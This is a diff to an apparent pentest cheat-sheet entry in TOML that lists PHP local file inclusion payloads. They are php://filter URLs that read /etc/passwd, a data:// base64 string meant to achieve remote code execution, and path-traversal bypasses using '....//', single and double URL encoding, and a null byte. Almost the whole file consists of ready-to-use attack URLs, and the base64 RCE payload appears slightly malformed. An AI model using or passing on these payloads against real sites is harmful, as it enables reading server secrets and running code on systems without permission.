@@ -1,16 +1,32 @@
 title = "Read files/RCE with PHP wrappers"
 description = "Exploiting local file inclusion (LFI) with php filters"
-tags = ["web", "LFI", "RCE"]
+tags = ["web", "LFI", "RCE", "bypass"]
 source = ["https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225"]
 
 [[data]]
 description = "PHP wrapper:"
-command = """fulano.com/view.php?file=php://filter/resource=../../../../etc/passwd"""
+command = """example.com/view.php?file=php://filter/resource=../../../../etc/passwd"""
 
 [[data]]
 description = "PHP wrapper (base64):"
-command = """fulano.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"""
+command = """example.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"""
 
 [[data]]
 description = "RCE through PHP data wrapper with base64:"
-command = """fulano.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Ph=="""
+command = """example.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Ph=="""
+
+[[data]]
+description = "Bypass non-recursively stripped path traversal sequence defense"
+command = """example.com/view.php?file=....//....//....//....//etc/passwd"""
+
+[[data]]
+description = "Bypass with URL encode"
+command = """#Simple URL encode
+example.com/view.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+#Double URL encode
+example.com/view.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+"""
+
+[[data]]
+description = "Bypass with null byte php < 5.3"
+command = """example.com/view.php?file=../../../../etc/passwd%00"""
